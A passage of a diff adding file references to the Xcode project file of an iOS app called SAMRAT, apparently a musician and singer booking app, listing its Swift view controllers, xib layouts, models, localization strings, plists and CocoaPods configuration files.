+		182F101B263C4A9900F93825 /* PaymentSuccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentSuccessVC.swift; sourceTree = "<group>"; };
+		182F101C263C4A9900F93825 /* PaymentSuccessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PaymentSuccessVC.xib; sourceTree = "<group>"; };
+		182F1022263C50DA00F93825 /* MusicianModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicianModel.swift; sourceTree = "<group>"; };
+		182F1028263C63A900F93825 /* MusiciansTVFooter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusiciansTVFooter.swift; sourceTree = "<group>"; };
+		182F1030263C63B100F93825 /* MusiciansTVFooter.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusiciansTVFooter.xib; sourceTree = "<group>"; };
+		184FF36826499A2800BDC454 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Main.strings; sourceTree = "<group>"; };
+		184FF36926499A2800BDC454 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		184FF36F26499A4F00BDC454 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
+		184FF37526499A5400BDC454 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
+		18559C8B264A2B220078C6C4 /* Localizer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Localizer.swift; sourceTree = "<group>"; };
+		185A6624264C03D0005D877C /* DemoGallaryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DemoGallaryVC.swift; sourceTree = "<group>"; };
+		185A6625264C03D0005D877C /* DemoGallaryVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DemoGallaryVC.xib; sourceTree = "<group>"; };
+		187594E3264399C20015BEBC /* CSMCommanModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CSMCommanModel.swift; sourceTree = "<group>"; };
+		187594E826439CCA0015BEBC /* CancallationPolicyVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancallationPolicyVC.swift; sourceTree = "<group>"; };
+		187594E926439CCA0015BEBC /* CancallationPolicyVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CancallationPolicyVC.xib; sourceTree = "<group>"; };
+		187594EF2643A9AA0015BEBC /* GalleryResponseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryResponseModel.swift; sourceTree = "<group>"; };
+		187595B82643FEFD0015BEBC /* MyBookingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyBookingVC.swift; sourceTree = "<group>"; };
+		187595B92643FEFD0015BEBC /* MyBookingVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyBookingVC.xib; sourceTree = "<group>"; };
+		187595E9264404BC0015BEBC /* MyUpcomingTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyUpcomingTVCell.swift; sourceTree = "<group>"; };
+		187595EA264404BC0015BEBC /* MyUpcomingTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyUpcomingTVCell.xib; sourceTree = "<group>"; };
+		187596062644139E0015BEBC /* BookingsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingsModel.swift; sourceTree = "<group>"; };
+		1875963D264441AE0015BEBC /* SAMRAT.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = SAMRAT.entitlements; sourceTree = "<group>"; };
+		18759645264442130015BEBC /* OneSignalNotificationServiceExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = OneSignalNotificationServiceExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		18759647264442130015BEBC /* NotificationService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationService.swift; sourceTree = "<group>"; };
+		18759649264442130015BEBC /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		1875965926444B330015BEBC /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		18877B43264B878000123166 /* SettingsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsModel.swift; sourceTree = "<group>"; };
+		1889FB3E264C4F630067464E /* AudioErrorType.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AudioErrorType.swift; sourceTree = "<group>"; };
+		1889FB3F264C4F630067464E /* Song_file.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = Song_file.mp3; sourceTree = "<group>"; };
+		1889FB40264C4F630067464E /* AudioPlayerManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AudioPlayerManager.swift; sourceTree = "<group>"; };
+		1889FB41264C4F630067464E /* song_fille_2.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = song_fille_2.mp3; sourceTree = "<group>"; };
+		188B0D2D263B01D8001EDA26 /* SingerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SingerModel.swift; sourceTree = "<group>"; };
+		188E9E1D263FEACB00469D62 /* CategoriesModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoriesModel.swift; sourceTree = "<group>"; };
+		188E9E24263FEBCC00469D62 /* HomeTCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTCell.swift; sourceTree = "<group>"; };
+		188E9E25263FEBCC00469D62 /* HomeTCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeTCell.xib; sourceTree = "<group>"; };
+		188E9E2E263FF03500469D62 /* CatSingerListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CatSingerListVC.swift; sourceTree = "<group>"; };
+		188E9E2F263FF03500469D62 /* CatSingerListVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CatSingerListVC.xib; sourceTree = "<group>"; };
+		188E9E35263FF0BF00469D62 /* SingerTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SingerTVCell.swift; sourceTree = "<group>"; };
+		188E9E36263FF0BF00469D62 /* SingerTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SingerTVCell.xib; sourceTree = "<group>"; };
+		18B6054D2638470700AD9F47 /* MyAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyAccountVC.swift; sourceTree = "<group>"; };
+		18B6054E2638470700AD9F47 /* MyAccountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyAccountVC.xib; sourceTree = "<group>"; };
+		18B6055726384D4500AD9F47 /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
+		18B6055826384D4500AD9F47 /* ChangePasswordVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChangePasswordVC.xib; sourceTree = "<group>"; };
+		18B6055E2638504B00AD9F47 /* BasicStuff.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicStuff.swift; sourceTree = "<group>"; };
+		18B605632638526000AD9F47 /* FAQVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FAQVC.swift; sourceTree = "<group>"; };
+		18B605642638526000AD9F47 /* FAQVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FAQVC.xib; sourceTree = "<group>"; };
+		18B6056B2638558400AD9F47 /* FaqTVHeader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaqTVHeader.swift; sourceTree = "<group>"; };
+		18B605702638558C00AD9F47 /* FaqTVHeader.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FaqTVHeader.xib; sourceTree = "<group>"; };
+		18B60576263857E800AD9F47 /* FaqTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaqTVCell.swift; sourceTree = "<group>"; };
+		18B60577263857E800AD9F47 /* FaqTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FaqTVCell.xib; sourceTree = "<group>"; };
+		18B6057E2638631D00AD9F47 /* MUSICIANSVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MUSICIANSVC.swift; sourceTree = "<group>"; };
+		18B6057F2638631D00AD9F47 /* MUSICIANSVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MUSICIANSVC.xib; sourceTree = "<group>"; };
+		18B6058A2638635D00AD9F47 /* MusicianTVHeader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicianTVHeader.swift; sourceTree = "<group>"; };
+		18B6058F2638636600AD9F47 /* MusicianTVHeader.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusicianTVHeader.xib; sourceTree = "<group>"; };
+		18B60594263866F300AD9F47 /* MusiciansTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusiciansTVCell.swift; sourceTree = "<group>"; };
+		18B60595263866F300AD9F47 /* MusiciansTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusiciansTVCell.xib; sourceTree = "<group>"; };
+		18D2AC3227A81974008C8C28 /* CustomAlertPopupVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomAlertPopupVC.swift; sourceTree = "<group>"; };
+		18D2AC3327A81974008C8C28 /* CustomAlertPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CustomAlertPopupVC.xib; sourceTree = "<group>"; };
+		18D3327127F2257600D5A92A /* SubCategoriesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SubCategoriesVC.swift; sourceTree = "<group>"; };
+		18D3327227F2257600D5A92A /* SubCategoriesVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SubCategoriesVC.xib; sourceTree = "<group>"; };
+		18D7F64B263989640074FBC0 /* BookNowWothCalendarVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookNowWothCalendarVC.swift; sourceTree = "<group>"; };
+		18D7F64C263989640074FBC0 /* BookNowWothCalendarVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookNowWothCalendarVC.xib; sourceTree = "<group>"; };
+		18FB4C1926412E3D000971F7 /* FaqsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaqsModel.swift; sourceTree = "<group>"; };
+		1A50A2C33DC80C72DBD521F1 /* Pods_SAMRAT.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_SAMRAT.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		2191F26DCBE67705A21B5302 /* Pods-SAMRAT-SAMRATUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRAT-SAMRATUITests.release.xcconfig"; path = "Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests.release.xcconfig"; sourceTree = "<group>"; };
+		2A983411EC181C790467DF8D /* Pods-SAMRATTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRATTests.debug.xcconfig"; path = "Target Support Files/Pods-SAMRATTests/Pods-SAMRATTests.debug.xcconfig"; sourceTree = "<group>"; };
+		3909438C2E0058FA0084B250 /* FTAnimation+UIView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTAnimation+UIView.m"; sourceTree = "<group>"; };
+		3909438D2E0058FA0084B250 /* FTAnimationManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FTAnimationManager.m; sourceTree = "<group>"; };
+		3909438E2E0058FA0084B250 /* FTUtils+NSObject.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+NSObject.m"; sourceTree = "<group>"; };
+		3909438F2E0058FA0084B250 /* FTUtils+UIGestureRecognizer.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+UIGestureRecognizer.m"; sourceTree = "<group>"; };
+		390943912E0058FA0084B250 /* FTAnimation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimation.h; sourceTree = "<group>"; };
+		390943922E0058FA0084B250 /* FTAnimation+UIView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTAnimation+UIView.h"; sourceTree = "<group>"; };
+		390943932E0058FA0084B250 /* FTAnimationManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimationManager.h; sourceTree = "<group>"; };
+		390943942E0058FA0084B250 /* FTUtils.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTUtils.h; sourceTree = "<group>"; };
+		390943952E0058FA0084B250 /* FTUtils+NSObject.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+NSObject.h"; sourceTree = "<group>"; };
+		390943962E0058FA0084B250 /* FTUtils+UIGestureRecognizer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+UIGestureRecognizer.h"; sourceTree = "<group>"; };
+		3909439E2E00591C0084B250 /* SAMRAT-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "SAMRAT-Header.h"; sourceTree = "<group>"; };
+		420412062679EB9600309783 /* loading-icon_2.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = "loading-icon_2.gif"; sourceTree = "<group>"; };
+		420412082679F15F00309783 /* ActivityIndicatorWithLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ActivityIndicatorWithLabel.swift; sourceTree = "<group>"; };
+		4204120A267B389100309783 /* MusicianListHeaderCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicianListHeaderCell.swift; sourceTree = "<group>"; };
+		4204120B267B389100309783 /* MusicianListHeaderCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusicianListHeaderCell.xib; sourceTree = "<group>"; };
+		4204120E267B38B400309783 /* MusicianListCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicianListCell.swift; sourceTree = "<group>"; };
+		4204120F267B38B400309783 /* MusicianListCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusicianListCell.xib; sourceTree = "<group>"; };
+		420DC765269C47EF0078B92E /* AlertView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = AlertView.xib; sourceTree = "<group>"; };
+		420DC766269C47EF0078B92E /* AlertView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlertView.swift; sourceTree = "<group>"; };
+		425D61002685B38400B9B548 /* CircularProgressBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CircularProgressBar.swift; sourceTree = "<group>"; };
+		425D610226904F3100B9B548 /* UImageView+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UImageView+Extension.swift"; sourceTree = "<group>"; };
+		42E1CBD0269CB06E005F37C4 /* AppConstant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppConstant.swift; sourceTree = "<group>"; };
+		42E1CBD2269CB555005F37C4 /* HBSegmentedControl.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HBSegmentedControl.swift; sourceTree = "<group>"; };
+		51D47556FB55840DA259AB62 /* Pods-SAMRAT-SAMRATUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRAT-SAMRATUITests.debug.xcconfig"; path = "Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		53A9B14FDDB2875EB7D4F5C4 /* Pods-SAMRAT.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRAT.release.xcconfig"; path = "Target Support Files/Pods-SAMRAT/Pods-SAMRAT.release.xcconfig"; sourceTree = "<group>"; };
+		5E52880D41254B99E21B7780 /* Pods-SAMRATTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRATTests.release.xcconfig"; path = "Target Support Files/Pods-SAMRATTests/Pods-SAMRATTests.release.xcconfig"; sourceTree = "<group>"; };
+		9164F0DA25E766E10024E8FE /* SAMRAT.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SAMRAT.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		9164F0DF25E766E10024E8FE /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		9164F0E425E766E10024E8FE /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		9164F0E725E766E10024E8FE /* SAMRAT.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = SAMRAT.xcdatamodel; sourceTree = "<group>"; };
+		9164F0E925E766E20024E8FE /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		9164F0EC25E766E20024E8FE /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		9164F0EE25E766E20024E8FE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		9164F0F325E766E20024E8FE /* SAMRATTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SAMRATTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		9164F0F725E766E20024E8FE /* SAMRATTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SAMRATTests.swift; sourceTree = "<group>"; };
+		9164F0F925E766E20024E8FE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		9164F0FE25E766E20024E8FE /* SAMRATUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SAMRATUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		9164F10225E766E20024E8FE /* SAMRATUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SAMRATUITests.swift; sourceTree = "<group>"; };
+		9164F10425E766E20024E8FE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		9179E90325E76A4000B3DC53 /* AppDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		9179E90625E76A4000B3DC53 /* ViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		9179E90C25E76A5500B3DC53 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		9179E91125E76A6F00B3DC53 /* MusiciansViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusiciansViewController.swift; sourceTree = "<group>"; };
+		9179E91625E76A7D00B3DC53 /* GalleryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryViewController.swift; sourceTree = "<group>"; };
+		9179E91B25E76A8800B3DC53 /* SettingsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
+		9179E92825E76B2C00B3DC53 /* TabBarViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabBarViewController.swift; sourceTree = "<group>"; };
+		9180CA5025EB633C00C37532 /* AppGlobal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppGlobal.swift; sourceTree = "<group>"; };
+		9180CA5A25EB8C2A00C37532 /* MusiciansTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusiciansTableViewCell.swift; sourceTree = "<group>"; };
+		9180CA5F25EB927C00C37532 /* MusiciansDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusiciansDetailsViewController.swift; sourceTree = "<group>"; };
+		9180CA6725EB9B0100C37532 /* SettingsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsTableViewCell.swift; sourceTree = "<group>"; };
+		9180CA6C25EB9CD100C37532 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
+		9180CA7125EB9CDD00C37532 /* ForgotPasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordViewController.swift; sourceTree = "<group>"; };
+		9180CA7625EB9CE600C37532 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
+		9180CA7B25EB9CF000C37532 /* ContactUsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactUsViewController.swift; sourceTree = "<group>"; };
+		9180CA8025EB9D7900C37532 /* CMSViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSViewController.swift; sourceTree = "<group>"; };
+		9A04CE7026C521A900425575 /* MultipleSingersMusicianbookVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultipleSingersMusicianbookVC.swift; sourceTree = "<group>"; };
+		9A04CE7126C521A900425575 /* MultipleSingersMusicianbookVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultipleSingersMusicianbookVC.xib; sourceTree = "<group>"; };
+		9A36869026C6D1D100EDF026 /* ServicesCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServicesCell.swift; sourceTree = "<group>"; };
+		9A36869126C6D1D100EDF026 /* ServicesCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ServicesCell.xib; sourceTree = "<group>"; };
+		9A5CE42326CA889F004584A1 /* ServiceModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServiceModel.swift; sourceTree = "<group>"; };
+		9A7D888A26C1B7EC00DC1C28 /* MultipleSingerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultipleSingerVC.swift; sourceTree = "<group>"; };
+		9A7D888B26C1B7EC00DC1C28 /* MultipleSingerVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultipleSingerVC.xib; sourceTree = "<group>"; };
+		A59F84F4132ACB1A98419388 /* Pods-SAMRAT.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SAMRAT.debug.xcconfig"; path = "Target Support Files/Pods-SAMRAT/Pods-SAMRAT.debug.xcconfig"; sourceTree = "<group>"; };
+		BC32306E29DAD2700068CB36 /* SMBandsBand.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SMBandsBand.swift; sourceTree = "<group>"; };
+		BC32306F29DAD2700068CB36 /* SMBands.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SMBands.swift; sourceTree = "<group>"; };
+		BC32307229DAD2D10068CB36 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
+		BC32307429DAD3440068CB36 /* NetConnection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetConnection.swift; sourceTree = "<group>"; };
+		BC91785729D7193500158B7A /* SelectBandViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectBandViewController.swift; sourceTree = "<group>"; };
+		BCC211C22901572900CFC359 /* WebPaymentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebPaymentVC.swift; sourceTree = "<group>"; };
+		BCD9A81B2913A65B009CD8F6 /* OneSignalNotificationServiceExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OneSignalNotificationServiceExtension.entitlements; sourceTree = "<group>"; };
+		BF09C5547A0BC6EC073B7378 /* Pods_SAMRAT_SAMRATUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_SAMRAT_SAMRATUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F78CD53C26D2059B00178848 /* LanguageSelectVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LanguageSelectVC.swift; sourceTree = "<group>"; };
+		F78CD54226D21D3500178848 /* VerifyOTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VerifyOTPVC.swift; sourceTree = "<group>"; };
+		F78CD54826D21D4500178848 /* SendOTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendOTPVC.swift; sourceTree = "<group>"; };
+		F7A06AB2270AE14B00063A8C /* Model.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Model.xcdatamodel; sourceTree = "<group>"; };
+		FA435E4F27C90F9D001AC622 /* CommonButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CommonButton.swift; sourceTree = "<group>"; };
+		FA435E5027C90F9D001AC622 /* CommonButton.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CommonButton.xib; sourceTree = "<group>"; };
+		FA68640128A439F6007A22FE /* CountryModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryModel.swift; sourceTree = "<group>"; };
+		FA68640328A43A42007A22FE /* CountrySelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountrySelectionViewController.swift; sourceTree = "<group>"; };
+		FA68640828A43E7C007A22FE /* CountrySelectionTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CountrySelectionTableViewCell.xib; sourceTree = "<group>"; };
+		FA68640928A43E7D007A22FE /* CountrySelectionTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountrySelectionTableViewCell.swift; sourceTree = "<group>"; };
+		FA7724EA280D89C50031DEAC /* MaintenanceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaintenanceViewController.swift; sourceTree = "<group>"; };
+		FA8A433627BBB158000E370A /* MusiciansServiceTVCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = MusiciansServiceTVCell.xib; sourceTree = "<group>"; };
+		FA8A433727BBB158000E370A /* MusiciansServiceTVCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MusiciansServiceTVCell.swift; sourceTree = "<group>"; };
+		FA8A433A27BCB54D000E370A /* MusicBarTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicBarTableViewCell.swift; sourceTree = "<group>"; };
+		FA8A433B27BCB54D000E370A /* MusicBarTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MusicBarTableViewCell.xib; sourceTree = "<group>"; };
+		FA8A433E27BD7D39000E370A /* ButtonCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ButtonCell.swift; sourceTree = "<group>"; };
+		FA8A433F27BD7D39000E370A /* ButtonCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = ButtonCell.xib; sourceTree = "<group>"; };
+		FA8F917627BA735600339EAE /* MusiciansDetailViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MusiciansDetailViewController.swift; sourceTree = "<group>"; };
+		FAB153062816DE0300F3A540 /* SingerServiceModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SingerServiceModel.swift; sourceTree = "<group>"; };
